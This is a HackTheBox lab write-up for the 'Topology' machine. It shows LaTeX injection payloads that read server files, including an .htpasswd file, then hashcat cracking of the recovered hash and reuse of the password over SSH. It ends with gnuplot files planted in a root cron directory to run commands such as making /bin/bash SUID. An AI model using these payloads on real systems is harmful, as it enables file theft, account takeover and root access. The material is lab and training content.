# [Topology](https://app.hackthebox.com/machines/Topology) - 04/08/2023 - HackTheBox write-up

## User flag

### Discovery

Starting with ̀`nmap` we can only found 2 different services : a SSH and an HTTP server on port 80.

The home page contains only an HTML site with a link to *latex.topology.htb/equation.php*. After some errors
with name resolutions, the solution was to just add *latex.topology.htb* to `/etc/hosts`.

Now, we have a page that take a LaTeX math input, typically an equation, and turn it into an image. So we can
think about LaTeX injection.

### Searching for vulnerability

By trying some payloads, we can deduce that some commands are blocked such as `\input` or `\write18`. Instead
we can use this snippet from [hacktricks](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#read-single-lined-file) :
```latex
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```

But, reading multiple lines is impossible with that because the command `\loop` is blocked too. However we can
use the command ̀`$\lstinputlisting{<file>}$` to read an entire file. Don't forget the `$` symbol or it will not
work.

### Exploitation

We have an arbitrary file read vulnerability and now we need to exploit it.

Before finding the vulnerability I ran a vhost enumeration with `gobuster`:
```bash
gobuster vhost --append-domain -u topology.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

and find those two additional subdomains:
    - `dev.topology.htb`
    - `stats.topology.htb`

The second isn't interesting but the first is protected with a Basic authentication. So, with our LFI we can
read the `.htpasswd` file from the `dev` subdomain. Our payload will be:
```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```

It returns : `vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO`. This is a custom Apache hash format, with
many MD5 iterations. It correspond to the mode 1600 for `hashcat`, so we can try to crack it :
```bash
$ hashcat -m 1600 -a 0 htpasswd.txt /usr/share/wordlists/rockyou.txt
[...]
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0:calculus20
```

The site behind the Basic HTTP authentication contains nothing, but we can reuse this credentials to connect
to the server through SSH, and get the user flag.

## Root flag

### Searching for elevating privileges

After researches I didn't found anything on the server. I found a new tool `pspy` that monitor all the commands
run on the system. After running it, we can find a cron job, running by root, that run the following command :
```bash
$ find /opt/gnuplot -name *.plt -exec gnuplot {} ;
```

It will execute all `.plt` file in `/opt/gnuplot/` folder with `gnuplot`.

### Exploitation

The problem is, we can run system command with Gnuplot, just by running `system "<cmd>"`.

So, we just need to create a file containing a command that allow us to read the root flag such as:
```
echo 'system "cat /root/root.txt > /tmp/anyfile"' > /opt/gnuplot/write-flag.plt
# or
echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/suid-bash.plt
```
